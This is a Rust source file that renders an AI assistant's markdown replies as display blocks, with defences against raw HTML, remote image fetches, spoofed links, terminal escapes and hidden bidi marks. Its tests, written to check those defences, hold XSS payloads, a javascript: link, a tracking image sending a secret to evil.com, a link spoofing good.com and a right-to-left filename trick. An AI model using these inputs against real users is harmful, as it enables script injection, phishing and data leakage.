//! A reply's markdown as display blocks, for the drawer to lay out with GPUI elements. Parsed
//! by pulldown-cmark into a small tree; never HTML: raw HTML is drawn as the text it is. A link
//! is a link only if `links::target` accepts it. An image is never fetched: a link, and a local
//! file in the repository that the shell may read itself. Text is cleaned of terminal escapes
//! and hidden marks, and capped. Pure.
// The drawer's native view draws these: the next change in the stack.
#![allow(dead_code)]

use ottospace_core::ax::truncate as cap;
use ottospace_core::links::{self, Target};
use pulldown_cmark::{CodeBlockKind, Event, Options, Parser, Tag, TagEnd};

/// The most blocks one reply is drawn as; the rest is counted.
pub const MAX_BLOCKS: usize = 300;
/// The most characters of one drawn line.
pub const MAX_LINE: usize = 2000;
/// The most lines of a code block drawn; Copy takes all of it.
pub const MAX_CODE_LINES: usize = 400;
/// Containers nested deeper than this are drawn flat.
const MAX_DEPTH: usize = 12;
/// The image files a thumbnail is drawn for.
const IMAGES: [&str; 5] = ["png", "jpg", "jpeg", "gif", "webp"];

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct Style {
    pub strong: bool,
    pub emphasis: bool,
    pub code: bool,
    pub strike: bool,
}

/// A link that may open: what `links::target` made of `raw`, the destination as written
/// (shown on hover).
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Link {
    pub target: Target,
    pub raw: String,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Span {
    pub text: String,
    pub style: Style,
    pub link: Option<Link>,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Block {
    Para(Vec<Span>),
    /// Every level drawn alike, a little bolder than text.
    Heading(Vec<Span>),
    /// `label`: the fence's language or file. `shown`: at most `MAX_CODE_LINES` lines; `more`:
    /// the lines left out. `copy`: the whole block.
    Code {
        label: Option<String>,
        shown: String,
        copy: String,
        more: usize,
    },
    Quote(Vec<Block>),
    /// `start`: the first number of an ordered list.
    List {
        start: Option<u64>,
        items: Vec<Vec<Block>>,
    },
    /// Rows of cells; the first row is the header.
    Table(Vec<Vec<Vec<Span>>>),
    /// A local image file in the repository: the shell may draw it as a thumbnail.
    Image {
        path: String,
    },
    Rule,
    /// What the caps left out, said in fixed words.
    Cut {
        blocks: usize,
    },
}

/// What is being built: a container of blocks, or a run of spans.
enum Frame {
    Root(Vec<Block>),
    Quote(Vec<Block>),
    List {
        start: Option<u64>,
        items: Vec<Vec<Block>>,
    },
    /// A list item: its blocks, and the spans of a tight item not yet a paragraph.
    Item(Vec<Block>, Vec<Span>),
    Para(Vec<Span>),
    Heading(Vec<Span>),
    Code {
        label: Option<String>,
        text: String,
    },
    Table {
        rows: Vec<Vec<Vec<Span>>>,
        row: Vec<Vec<Span>>,
        cell: Vec<Span>,
    },
    /// A container nested too deep: what it holds goes to the one around it.
    Flat,
}

/// A link being read: what it opens, as written, and its text so far.
struct Open {
    link: Option<Link>,
    raw: String,
    text: String,
}

struct Builder<'a> {
    repo: Option<&'a str>,
    frames: Vec<Frame>,
    style: Style,
    links: Vec<Open>,
    /// An image's alt text being read, and its destination.
    image: Option<(String, String)>,
    /// Local images seen in the block being read: drawn after it.
    pictures: Vec<String>,
    blocks: usize,
    cut: usize,
    /// Characters on the drawn line so far (`budget`).
    line: usize,
}

/// `text`, a reply's markdown, as blocks. `repo`: the task's repository, whose files may be links.
pub fn parse(text: &str, repo: Option<&str>) -> Vec<Block> {
    let options = Options::ENABLE_TABLES | Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TASKLISTS;
    let mut b = Builder {
        repo,
        frames: vec![Frame::Root(Vec::new())],
        style: Style::default(),
        links: Vec::new(),
        image: None,
        pictures: Vec::new(),
        blocks: 0,
        cut: 0,
        line: 0,
    };
    for event in Parser::new_ext(text, options) {
        b.event(event);
    }
    // What a broken stream left open is closed as it stands.
    while b.frames.len() > 1 {
        b.close();
    }
    let Some(Frame::Root(mut blocks)) = b.frames.pop() else { return Vec::new() };
    if b.cut > 0 {
        blocks.push(Block::Cut { blocks: b.cut });
    }
    blocks
}

impl Builder<'_> {
    fn depth(&self) -> usize {
        self.frames
            .iter()
            .filter(|frame| matches!(frame, Frame::Quote(_) | Frame::List { .. } | Frame::Item(..)))
            .count()
    }

    /// A container, or `Flat` past `MAX_DEPTH`.
    fn open(&mut self, frame: Frame) {
        let deep = self.depth() >= MAX_DEPTH && matches!(frame, Frame::Quote(_) | Frame::List { .. } | Frame::Item(..));
        self.frames.push(if deep { Frame::Flat } else { frame });
    }

    fn event(&mut self, event: Event) {
        match event {
            Event::Start(tag) => self.start(tag),
            Event::End(tag) => self.end(tag),
            Event::Text(text) => self.text(&text),
            Event::Code(text) => {
                let style = Style { code: true, ..self.style };
                self.span(clean(&text), style);
            }
            // Raw HTML is the text it is: never a tag.
            Event::Html(text) | Event::InlineHtml(text) => self.text(&text),
            Event::SoftBreak => self.text(" "),
            Event::HardBreak => self.text("\n"),
            Event::Rule => self.block(Block::Rule),
            Event::TaskListMarker(done) => self.text(if done { "[x] " } else { "[ ] " }),
            Event::FootnoteReference(name) => self.text(&format!("[{name}]")),
            Event::InlineMath(text) | Event::DisplayMath(text) => self.text(&text),
        }
    }

    fn start(&mut self, tag: Tag) {
        if matches!(tag, Tag::Paragraph | Tag::Heading { .. } | Tag::Item | Tag::TableCell) {
            self.line = 0;
        }
        match tag {
            Tag::Paragraph => self.frames.push(Frame::Para(Vec::new())),
            Tag::Heading { .. } => self.frames.push(Frame::Heading(Vec::new())),
            Tag::BlockQuote(_) => self.open(Frame::Quote(Vec::new())),
            Tag::CodeBlock(kind) => {
                let label = match kind {
                    CodeBlockKind::Fenced(info) => info.split_whitespace().next().map(|word| cap(&clean(word), 40)),
                    CodeBlockKind::Indented => None,
                };
                self.frames.push(Frame::Code { label: label.filter(|label| !label.is_empty()), text: String::new() });
            }
            Tag::List(start) => self.open(Frame::List { start, items: Vec::new() }),
            Tag::Item => self.open(Frame::Item(Vec::new(), Vec::new())),
            Tag::Table(_) => self.frames.push(Frame::Table { rows: Vec::new(), row: Vec::new(), cell: Vec::new() }),
            Tag::Emphasis => self.style.emphasis = true,
            Tag::Strong => self.style.strong = true,
            Tag::Strikethrough => self.style.strike = true,
            Tag::Link { dest_url, .. } => {
                let raw = dest_url.to_string();
                let link = links::target(&raw, self.repo).map(|target| Link { target, raw: clean(&raw) });
                self.links.push(Open { link, raw, text: String::new() });
            }
            Tag::Image { dest_url, .. } => self.image = Some((dest_url.to_string(), String::new())),
            _ => {}
        }
    }

    fn end(&mut self, tag: TagEnd) {
        match tag {
            TagEnd::Paragraph
            | TagEnd::Heading(_)
            | TagEnd::BlockQuote(_)
            | TagEnd::CodeBlock
            | TagEnd::List(_)
            | TagEnd::Item
            | TagEnd::Table => self.close(),
            TagEnd::TableHead | TagEnd::TableRow => {
                if let Some(Frame::Table { rows, row, .. }) = self.frames.last_mut() {
                    rows.push(std::mem::take(row));
                }
            }
            TagEnd::TableCell => {
                if let Some(Frame::Table { row, cell, .. }) = self.frames.last_mut() {
                    row.push(std::mem::take(cell));
                }
            }
            TagEnd::Emphasis => self.style.emphasis = false,
            TagEnd::Strong => self.style.strong = false,
            TagEnd::Strikethrough => self.style.strike = false,
            TagEnd::Link => {
                let Some(open) = self.links.pop() else { return };
                // Text that reads as an address but is not this link's: the real one is shown too.
                let text = open.text.trim();
                let looks = text.to_ascii_lowercase().starts_with("http") || text.contains("://");
                if open.link.is_some() && looks && text != open.raw {
                    // Outside the line's budget: however long the text, where it goes always shows.
                    let real = format!(" ({})", cap(&clean(&open.raw), MAX_LINE));
                    self.push_span(Span { text: real, style: self.style, link: None });
                }
            }
            TagEnd::Image => {
                let Some((raw, alt)) = self.image.take() else { return };
                let target = links::target(&raw, self.repo);
                let picture = match &target {
                    Some(Target::File(path)) => {
                        IMAGES.iter().any(|ext| path.to_ascii_lowercase().ends_with(&format!(".{ext}")))
                    }
                    _ => false,
                };
                if let (true, Some(Target::File(path))) = (picture, &target) {
                    self.pictures.push(path.clone());
                }
                // An image inside a link is its text: alt text that names an address is checked too.
                if let Some(open) = self.links.last_mut() {
                    open.text.push_str(&alt);
                }
                // Never loaded from where it says: a link to it, under its alt text.
                let shown = if alt.trim().is_empty() { "image".to_string() } else { alt };
                let link = target.map(|target| Link { target, raw: clean(&raw) });
                let span = Span { text: self.budget(&format!("[image: {shown}]")), style: self.style, link };
                self.push_span(span);
            }
            _ => {}
        }
    }

    /// Ends the innermost frame and gives what it built to the one around it.
    fn close(&mut self) {
        self.line = 0;
        let Some(frame) = self.frames.pop() else { return };
        match frame {
            Frame::Root(blocks) => self.frames.push(Frame::Root(blocks)),
            Frame::Quote(blocks) => self.block(Block::Quote(blocks)),
            Frame::List { start, items } => self.block(Block::List { start, items }),
            Frame::Item(mut blocks, spans) => {
                if !spans.is_empty() && self.room() {
                    blocks.push(Block::Para(spans));
                }
                match self.frames.last_mut() {
                    Some(Frame::List { items, .. }) => items.push(blocks),
                    _ => blocks.into_iter().for_each(|block| self.block(block)),
                }
            }
            Frame::Para(spans) => self.block(Block::Para(spans)),
            Frame::Heading(spans) => self.block(Block::Heading(spans)),
            Frame::Code { label, text } => {
                let copy = text.strip_suffix('\n').unwrap_or(&text).to_string();
                let lines: Vec<&str> = copy.split('\n').collect();
                let shown: Vec<String> = lines.iter().take(MAX_CODE_LINES).map(|line| cap(line, MAX_LINE)).collect();
                let more = lines.len().saturating_sub(MAX_CODE_LINES);
                self.block(Block::Code { label, shown: shown.join("\n"), copy, more });
            }
            Frame::Table { mut rows, row, cell } => {
                let mut row = row;
                if !cell.is_empty() {
                    row.push(cell);
                }
                if !row.is_empty() {
                    rows.push(row);
                }
                self.block(Block::Table(rows));
            }
            Frame::Flat => {}
        }
    }

    /// Adds a block to the innermost container, then any pictures it named. Past `MAX_BLOCKS`,
    /// counted and left out.
    fn block(&mut self, block: Block) {
        let pictures = std::mem::take(&mut self.pictures).into_iter().map(|path| Block::Image { path });
        let add: Vec<Block> = std::iter::once(block).chain(pictures).collect();
        for block in add {
            // A tight list item's text, made a paragraph here, counts with the block after it.
            if !self.room() {
                continue;
            }
            match self.frames.iter_mut().rev().find(|frame| !matches!(frame, Frame::Flat)) {
                Some(Frame::Root(blocks) | Frame::Quote(blocks)) => blocks.push(block),
                Some(Frame::Item(blocks, spans)) => {
                    if !spans.is_empty() {
                        blocks.push(Block::Para(std::mem::take(spans)));
                    }
                    blocks.push(block);
                }
                Some(Frame::List { items, .. }) => items.push(vec![block]),
                // A block inside a run of text (a rule in a cell): its text, if it has any.
                Some(_) | None => {}
            }
        }
    }

    /// True if one more block may be drawn; else it is counted as cut.
    fn room(&mut self) -> bool {
        let room = self.blocks < MAX_BLOCKS;
        if room {
            self.blocks += 1
        } else {
            self.cut += 1
        }
        room
    }

    /// `text` within the drawn line's budget: at most `MAX_LINE` characters a line, whatever
    /// the spans it is made of; past it, `…` once.
    fn budget(&mut self, text: &str) -> String {
        let mut out = String::with_capacity(text.len().min(MAX_LINE + 4));
        for c in text.chars() {
            match c {
                '\n' => {
                    self.line = 0;
                    out.push(c);
                }
                _ if self.line < MAX_LINE => {
                    self.line += 1;
                    out.push(c);
                }
                _ if self.line == MAX_LINE => {
                    self.line += 1;
                    out.push('…');
                }
                _ => {}
            }
        }
        out
    }

    fn text(&mut self, text: &str) {
        let text = clean(text);
        if let Some(Frame::Code { text: code, .. }) = self.frames.last_mut() {
            code.push_str(&text);
            return;
        }
        if let Some((_, alt)) = &mut self.image {
            alt.push_str(&text);
            return;
        }
        self.span(text, self.style);
    }

    fn span(&mut self, text: String, style: Style) {
        let text = self.budget(&text);
        if let Some(open) = self.links.last_mut() {
            open.text.push_str(&text);
        }
        let link = self.links.last().and_then(|open| open.link.clone());
        self.push_span(Span { text, style, link });
    }

    fn push_span(&mut self, span: Span) {
        match self.frames.iter_mut().rev().find(|frame| !matches!(frame, Frame::Flat)) {
            Some(Frame::Para(spans) | Frame::Heading(spans) | Frame::Item(_, spans)) => spans.push(span),
            Some(Frame::Table { cell, .. }) => cell.push(span),
            Some(Frame::Code { text, .. }) => text.push_str(&span.text),
            // Text straight in a container (raw HTML at the top): a paragraph of its own.
            Some(_) | None => self.block(Block::Para(vec![span])),
        }
    }
}

/// Text as drawn: terminal escape sequences and other control characters out (a tab is four
/// spaces), marks that hide or reorder text written out (`\u{202e}`).
pub fn clean(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\u{1b}' => ottospace_core::workbook::skip_escape(&mut chars),
            '\n' => out.push('\n'),
            '\t' => out.push_str("    "),
            c if c.is_control() => {}
            // Hidden or reordering marks (`capture::shows`) and line separators, written out.
            c if !ottospace_core::capture::shows(c) || matches!(c, '\u{2028}' | '\u{2029}') => {
                out.extend(c.escape_unicode())
            }
            c => out.push(c),
        }
    }
    out
}

/// The blocks as plain text, for Copy.
pub fn plain(blocks: &[Block]) -> String {
    let spans = |spans: &[Span]| spans.iter().map(|span| span.text.as_str()).collect::<String>();
    let mut parts = Vec::new();
    for block in blocks {
        parts.push(match block {
            Block::Para(s) | Block::Heading(s) => spans(s),
            Block::Code { copy, .. } => copy.clone(),
            Block::Quote(inner) => plain(inner).lines().map(|line| format!("> {line}")).collect::<Vec<_>>().join("\n"),
            Block::List { start, items } => items
                .iter()
                .enumerate()
                .map(|(at, item)| match start {
                    Some(n) => format!("{}. {}", n + at as u64, plain(item)),
                    None => format!("- {}", plain(item)),
                })
                .collect::<Vec<_>>()
                .join("\n"),
            Block::Table(rows) => rows
                .iter()
                .map(|row| row.iter().map(|cell| spans(cell)).collect::<Vec<_>>().join("\t"))
                .collect::<Vec<_>>()
                .join("\n"),
            Block::Image { .. } => continue,
            Block::Rule => "---".into(),
            Block::Cut { blocks } => format!("[{blocks} more blocks]"),
        });
    }
    parts.join("\n\n")
}

/// Every link the blocks hold, in order.
pub fn links_of(blocks: &[Block]) -> Vec<&Link> {
    fn spans(spans: &[Span]) -> impl Iterator<Item = &Link> {
        spans.iter().filter_map(|span| span.link.as_ref())
    }
    let mut out = Vec::new();
    for block in blocks {
        match block {
            Block::Para(s) | Block::Heading(s) => out.extend(spans(s)),
            Block::Quote(inner) => out.extend(links_of(inner)),
            Block::List { items, .. } => items.iter().for_each(|item| out.extend(links_of(item))),
            Block::Table(rows) => rows.iter().flatten().for_each(|cell| out.extend(spans(cell))),
            _ => {}
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    const REPO: Option<&str> = Some("/w/app");

    fn texts(spans: &[Span]) -> String {
        spans.iter().map(|span| span.text.as_str()).collect()
    }

    #[test]
    fn a_reply_becomes_blocks() {
        let text = "# Title\n\nSome **bold** and `code`, a [link](https://example.com/a) and [a file](src/main.rs:3).\n\n\
                    ```rust\nfn main() {}\n```\n\n> quoted\n\n- one\n- two\n\n1. first\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n---\n";
        let blocks = parse(text, REPO);
        assert!(matches!(&blocks[0], Block::Heading(s) if texts(s) == "Title"));
        let Block::Para(spans) = &blocks[1] else { panic!("{blocks:#?}") };
        assert!(spans.iter().any(|s| s.text == "bold" && s.style.strong));
        assert!(spans.iter().any(|s| s.text == "code" && s.style.code));
        let targets: Vec<&Target> = links_of(&blocks).into_iter().map(|link| &link.target).collect();
        assert_eq!(targets, [&Target::Web("https://example.com/a".into()), &Target::File("/w/app/src/main.rs".into())]);
        assert_eq!(
            blocks[2],
            Block::Code {
                label: Some("rust".into()),
                shown: "fn main() {}".into(),
                copy: "fn main() {}".into(),
                more: 0
            }
        );
        assert!(matches!(&blocks[3], Block::Quote(inner) if plain(inner) == "quoted"));
        assert!(matches!(&blocks[4], Block::List { start: None, items } if items.len() == 2));
        assert!(matches!(&blocks[5], Block::List { start: Some(1), .. }));
        assert!(matches!(&blocks[6], Block::Table(rows) if rows.len() == 2 && texts(&rows[1][1]) == "2"));
        assert_eq!(blocks[7], Block::Rule);
    }

    /// No HTML, no fetch, no scheme but the web's, nothing hidden.
    #[test]
    fn what_could_harm_is_text() {
        let text = "<script>alert(1)</script>\n\n<img src=x onerror=alert(1)> [x](javascript:alert(1)) \
                    ![pixel](https://evil.com/p.png?secret=1) ![shot](docs/shot.png) [https://good.com](https://evil.com) \
                    \u{1b}[31mred\u{1b}[0m \u{202e}fdp.exe";
        let blocks = parse(text, REPO);
        let all = plain(&blocks);
        assert!(all.contains("<script>alert(1)</script>") && all.contains("<img src=x onerror=alert(1)>"), "{all}");
        assert!(all.contains("red") && !all.contains('\u{1b}') && all.contains("\\u{202e}fdp.exe"), "{all:?}");
        let links: Vec<(&Target, &str)> = links_of(&blocks).into_iter().map(|l| (&l.target, l.raw.as_str())).collect();
        assert!(links.iter().all(|(target, _)| !matches!(target, Target::Web(url) if url.starts_with("javascript"))));
        // The remote image is a link under its alt text, never a picture; the local one may be drawn.
        assert!(all.contains("[image: pixel]"));
        assert!(
            links
                .contains(&(&Target::Web("https://evil.com/p.png?secret=1".into()), "https://evil.com/p.png?secret=1"))
        );
        assert!(blocks.contains(&Block::Image { path: "/w/app/docs/shot.png".into() }));
        assert!(!blocks.iter().any(|b| matches!(b, Block::Image { path } if path.contains("evil"))));
        // A link whose text is another address shows the real one.
        assert!(all.contains("https://good.com (https://evil.com)"), "{all}");
        // A text long enough to use up the line's budget still leaves the real address shown.
        let long = format!("[https://good.com/{}](https://evil.com/x)", "a".repeat(MAX_LINE * 2));
        assert!(plain(&parse(&long, REPO)).ends_with(" (https://evil.com/x)"), "the real target is shown");
        let image = plain(&parse("[![https://good.com](x.png)](https://evil.com)", REPO));
        assert!(image.contains("(https://evil.com)"), "an image's alt text is the link's text: {image}");
        // Every escape a terminal reads, and every hidden mark.
        let hidden = plain(&parse("a\u{1b}Ppayload\u{1b}\\b \u{61c}c \u{2060}d", None));
        assert_eq!(hidden, "ab \\u{61c}c \\u{2060}d");
    }

    #[test]
    fn long_text_is_capped() {
        let code =
            format!("```\n{}\n```", (0..MAX_CODE_LINES + 7).map(|n| n.to_string()).collect::<Vec<_>>().join("\n"));
        let Block::Code { shown, copy, more, .. } = &parse(&code, None)[0] else { panic!() };
        assert_eq!((shown.lines().count(), *more, copy.lines().count()), (MAX_CODE_LINES, 7, MAX_CODE_LINES + 7));
        let line = "a".repeat(MAX_LINE * 2);
        let Block::Para(spans) = &parse(&line, None)[0] else { panic!() };
        assert_eq!(spans[0].text.chars().count(), MAX_LINE + 1);
        let many = "x\n\n".repeat(MAX_BLOCKS + 10);
        let blocks = parse(&many, None);
        assert_eq!((blocks.len(), blocks.last()), (MAX_BLOCKS + 1, Some(&Block::Cut { blocks: 10 })));
        // A line of many spans, a tight list, and pictures: the caps hold for each.
        let spans = "a **b** ".repeat(MAX_LINE);
        let Block::Para(drawn) = &parse(&spans, None)[0] else { panic!() };
        let longest = texts(drawn).split('\n').map(|line| line.chars().count()).max().unwrap_or(0);
        assert!(longest <= MAX_LINE + 1, "{longest}");
        let count = |blocks: &[Block]| -> usize {
            fn all(blocks: &[Block]) -> usize {
                blocks
                    .iter()
                    .map(|b| match b {
                        Block::Quote(inner) => 1 + all(inner),
                        Block::List { items, .. } => 1 + items.iter().map(|item| all(item)).sum::<usize>(),
                        _ => 1,
                    })
                    .sum()
            }
            all(blocks)
        };
        assert!(count(&parse(&"- x\n".repeat(MAX_BLOCKS * 10), None)) <= MAX_BLOCKS * 2 + 2);
        assert!(count(&parse(&"![x](a.png)\n\n".repeat(MAX_BLOCKS * 2), REPO)) <= MAX_BLOCKS * 2 + 2);
        let deep = format!("{}x", "> ".repeat(500));
        assert!(!parse(&deep, None).is_empty());
    }

    /// Whatever the model writes: no panic, every link one `links::target` gives for its own
    /// destination, no control character drawn, no line past the cap.
    #[test]
    fn any_markdown_gives_only_safe_blocks() {
        const PIECES: &[&str] = &[
            "[",
            "]",
            "(",
            ")",
            "![",
            "<",
            ">",
            "`",
            "```",
            "*",
            "_",
            "~~",
            "#",
            "- ",
            "1. ",
            "> ",
            "|",
            "---",
            "\n",
            "\n\n",
            " ",
            "https://e.com",
            "javascript:x",
            "src/a.rs",
            "../x",
            "%2e%2e",
            "\u{1b}[2J",
            "\u{202e}",
            "\t",
            "<b>",
            "</b>",
            "a",
            "é",
            "\\",
            "\"",
            "[x]",
            "@",
            "  \n",
        ];
        let mut seed = 5u64;
        let mut next = |n: usize| {
            seed = seed.wrapping_mul(6_364_136_223_846_793_005).wrapping_add(1_442_695_040_888_963_407);
            (seed >> 33) as usize % n
        };
        fn walk(blocks: &[Block], spans: &mut Vec<Span>) {
            for block in blocks {
                match block {
                    Block::Para(s) | Block::Heading(s) => spans.extend(s.iter().cloned()),
                    Block::Quote(inner) => walk(inner, spans),
                    Block::List { items, .. } => items.iter().for_each(|item| walk(item, spans)),
                    Block::Table(rows) => rows.iter().flatten().for_each(|cell| spans.extend(cell.iter().cloned())),
                    Block::Code { shown, label, .. } => {
                        let text = format!("{}{shown}", label.clone().unwrap_or_default());
                        spans.push(Span { text, style: Style::default(), link: None });
                    }
                    Block::Image { path } => assert!(path.starts_with("/w/app/"), "{path}"),
                    _ => {}
                }
            }
        }
        for _ in 0..5000 {
            let text: String = (0..next(30)).map(|_| PIECES[next(PIECES.len())]).collect();
            let blocks = parse(&text, REPO);
            for link in links_of(&blocks) {
                assert_eq!(links::target(&link.raw, REPO).as_ref(), Some(&link.target), "{text:?}");
            }
            let mut spans = Vec::new();
            walk(&blocks, &mut spans);
            for span in spans {
                assert!(!span.text.chars().any(|c| c.is_control() && c != '\n'), "{text:?} → {:?}", span.text);
                assert!(!span.text.contains('\u{202e}'), "{text:?}");
                assert!(span.text.split('\n').all(|line| line.chars().count() <= MAX_LINE + 1));
            }
        }
    }
}
